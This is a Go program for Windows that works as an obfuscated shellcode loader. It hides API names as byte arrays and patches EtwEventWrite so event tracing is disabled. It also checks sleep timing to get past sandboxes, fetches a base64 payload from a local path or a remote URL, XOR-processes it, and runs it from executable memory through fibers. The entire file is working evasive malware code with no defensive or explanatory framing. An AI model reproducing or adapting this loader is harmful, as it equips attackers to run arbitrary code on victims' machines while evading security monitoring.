package main

import (
	"encoding/base64"
	"flag"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"os"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

func jefrroi2s() int {
	x := 0
	for i := 0; i < 16; i++ {
		x += i * 4
	}
	return x
}

func n8646hxbfcxo() []int {
	s := make([]int, 15)
	for i := range s {
		s[i] = i * 4 + 24
	}
	return s
}

func stftljhtk() []int {
	s := make([]int, 10)
	for i := range s {
		s[i] = i * 3 + 13
	}
	return s
}

func k5x5k6gsur7k0() string {
	b := make([]byte, 17)
	for i := range b {
		b[i] = byte(82 + (i % 3))
	}
	return string(b)
}

func tq8nr33c(n string) *windows.LazyDLL {
	return windows.NewLazySystemDLL(n)
}

func sasoz5jhik1() {
	j34lp5zaek := tq8nr33c(string([]byte{110,116,100,108,108,46,100,108,108}))
	yc35gf2 := j34lp5zaek.NewProc(string([]byte{69,116,119,69,118,101,110,116,87}) + string([]byte{114,105,116,101}))
	yc35gf2.Find()
	patch := []byte{0xC3} // ret
	var qcgh8d6nn3j uint32
	qyfgwvu0 := tq8nr33c(string([]byte{107,101,114,110,101,108,51,50,46,100,108,108}))
	vp := qyfgwvu0.NewProc(string([]byte{86,105,114,116,117,97,108,80,114,111}) + string([]byte{116}) + string([]byte{101}) + string([]byte{99,116}))
	vp.Call(yc35gf2.Addr(), 1, 0x40, uintptr(unsafe.Pointer(&qcgh8d6nn3j)))
	*(*byte)(unsafe.Pointer(yc35gf2.Addr())) = patch[0]
	vp.Call(yc35gf2.Addr(), 1, uintptr(qcgh8d6nn3j), uintptr(unsafe.Pointer(&qcgh8d6nn3j)))
}

func bg8oiluz() bool {
	gv1bgkd := time.Now()
	time.Sleep(3203 * time.Millisecond)
	azssu45bgss := time.Since(gv1bgkd)
	return azssu45bgss.Milliseconds() >= 2903
}

func i3oeeua3(url string) ([]byte, error) {
	ouu9bj0ecls := &http.Client{Timeout: 30 * time.Second}
	o4pq2tcri, err := ouu9bj0ecls.Get(url)
	if err != nil {
		return nil, err
	}
	defer o4pq2tcri.Body.Close()
	return ioutil.ReadAll(o4pq2tcri.Body)
}

func u8prfmf3l(p string) ([]byte, error) {
	return ioutil.ReadFile(p)
}

func aulfcezhdje(data []byte) ([]byte, error) {
	return base64.StdEncoding.DecodeString(string(data))
}

func q5swgc3l6a4(data []byte) []byte {
	key := byte(42)
	out := make([]byte, len(data))
	for i := range data {
		out[i] = data[i] ^ key
	}
	return out
}

func ef42ech(k2bqiopp0ewf []byte) {
	// Patch ETW before execution
	sasoz5jhik1()

	qyfgwvu0 := tq8nr33c(string([]byte{107,101,114,110,101,108,51,50,46,100,108,108}))
	j34lp5zaek := tq8nr33c(string([]byte{110,116,100,108,108,46,100,108,108}))

	my9ku9e := qyfgwvu0.NewProc(string([]byte{86,105,114,116,117,97,108,65,108,108}) + string([]byte{111,99}))
	p5mp1j8nnmiu := qyfgwvu0.NewProc(string([]byte{86,105,114,116,117,97,108,80,114,111}) + string([]byte{116}) + string([]byte{101}) + string([]byte{99,116}))
	u3rhi533 := j34lp5zaek.NewProc(string([]byte{82,116,108,77,111,118,101,77,101,109,111}) + string([]byte{114,121}))

	uimrumweqqvs := uintptr(len(k2bqiopp0ewf))

	// Allocate RW memory
	jv9isdx2a4hyw, _, _ := my9ku9e.Call(0, uimrumweqqvs, 0x3000, 0x04)
	if jv9isdx2a4hyw == 0 {
		return
	}

	// XOR encode in-memory then copy (forces unique memory pattern)
	pqapitv2p2t := q5swgc3l6a4(q5swgc3l6a4(k2bqiopp0ewf))

	// Copy shellcode
	u3rhi533.Call(jv9isdx2a4hyw, uintptr(unsafe.Pointer(&pqapitv2p2t[0])), uimrumweqqvs)

	// Change to RX
	var qcgh8d6nn3j uint32
	p5mp1j8nnmiu.Call(jv9isdx2a4hyw, uimrumweqqvs, 0x20, uintptr(unsafe.Pointer(&qcgh8d6nn3j)))

	a8zy9qc0l8n44 := qyfgwvu0.NewProc(string([]byte{67,111,110,118,101,114,116,84,104,114,101,97,100,84,111,70,105,98,101}) + string([]byte{114}))
	cc70npnq7cx0 := qyfgwvu0.NewProc(string([]byte{67,114,101,97,116,101,70,105,98,101}) + string([]byte{114}))
	ou5im2ct70g := qyfgwvu0.NewProc(string([]byte{83,119,105,116,99}) + string([]byte{104,84,111,70,105,98,101,114}))

	time.Sleep(time.Duration(rand.Intn(643)) * time.Millisecond)

	// Convert current thread to fiber, create shellcode fiber, switch
	a8zy9qc0l8n44.Call(0)
	xjoojtp, _, _ := cc70npnq7cx0.Call(0, jv9isdx2a4hyw, 0)
	if xjoojtp != 0 {
		ou5im2ct70g.Call(xjoojtp)
	}
}

func main() {
	f0w9vu1uq := flag.String("local", "", "local path")
	p54jtecc47 := flag.String("remote", "", "remote url")
	flag.Parse()

	if !bg8oiluz() {
		os.Exit(0)
	}

	var d7pzvseb2 []byte
	var err error

	if *f0w9vu1uq != "" {
		d7pzvseb2, err = u8prfmf3l(*f0w9vu1uq)
	} else if *p54jtecc47 != "" {
		d7pzvseb2, err = i3oeeua3(*p54jtecc47)
	} else {
		fmt.Println("Usage: -local <path> | -remote <url>")
		os.Exit(1)
	}

	if err != nil {
		fmt.Fprintf(os.Stderr, "[!] %v\n", err)
		os.Exit(1)
	}

	var qld7cvb1e69qz []byte
	qld7cvb1e69qz, err = aulfcezhdje(d7pzvseb2)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[!] %v\n", err)
		os.Exit(1)
	}

	ef42ech(qld7cvb1e69qz)
}
